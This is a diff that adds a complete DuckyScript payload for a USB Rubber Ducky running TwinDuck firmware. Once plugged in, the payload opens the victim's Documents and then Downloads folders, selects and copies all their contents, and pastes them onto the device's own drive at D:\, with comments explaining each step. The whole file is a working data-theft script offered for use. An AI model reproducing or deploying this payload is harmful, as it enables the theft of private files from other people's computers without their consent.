@@ -1,0 +1,56 @@
+REM Copies all contents from documents folder and pastes them into the duck
+REM Using TwinDuck firmware.
+REM Once the first half has been completed it goes into the downloads folder
+REM And does the same.
+DELAY 5000
+REM Minimizes all active tabs
+GUI d
+DELAY 500
+REM Opens documents folder and copies all contents.
+GUI r
+DELAY 500
+STRING documents
+DELAY 500
+ENTER
+DELAY 500
+CTRL a
+DELAY 500
+CTRL c
+DELAY 500
+REM Opens ducky folder
+WINDOWS r
+DELAY 500
+STRING D:\
+DELAY 500
+ENTER
+DELAY 500
+REM Pastes
+CTRL v
+DELAY 500
+GUI D
+DELAY 10000
+REM Opens downloads folder and enters it.
+GUI r
+DELAY 500
+STRING downloads
+DELAY 500
+ENTER
+DELAY 500
+CTRL a
+DELAY 500
+CTRL c
+DELAY 500
+GUI d
+DELAY 500
+REM Copies all contents in downloads folder and opens the ducky SD card.
+WINDOWS r
+DELAY 500
+STRING D:\
+DELAY 500
+ENTER
+DELAY 500
+REM Pastes anything from clipboard (So downloads folder)
+CTRL v
+DELAY 500
+GUI d
+DELAY 10000
